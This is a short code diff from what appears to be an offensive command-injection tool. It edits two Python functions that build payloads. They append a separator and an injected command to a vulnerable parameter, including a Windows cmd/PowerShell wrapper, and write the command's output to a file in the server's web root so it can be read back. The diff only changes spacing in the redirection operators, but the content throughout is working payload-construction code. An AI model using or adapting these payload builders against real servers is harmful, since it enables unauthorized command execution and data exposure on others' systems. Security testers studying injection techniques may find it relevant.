@@ -34,7 +34,7 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
               ) 
   else:
     payload = (separator +
-              "echo " + TAG + " > " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + " "
+              "echo " + TAG + ">" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + " "
               ) 
 
   return payload
@@ -78,11 +78,11 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
               "for /f \"delims=\" %i in ('cmd /c \"" +
               "powershell.exe -InputFormat none write-host (cmd /c \"" +
               cmd + 
-              "\")\"') do @set /p =%i " + " > " + OUTPUT_TEXTFILE + " <nul"
+              "\")\"') do @set /p =%i " + ">" + OUTPUT_TEXTFILE + " <nul"
               ) 
   else:
     payload = (separator +
-              cmd + " > " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + " "
+              cmd + ">" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + " "
               )
 
   return payload
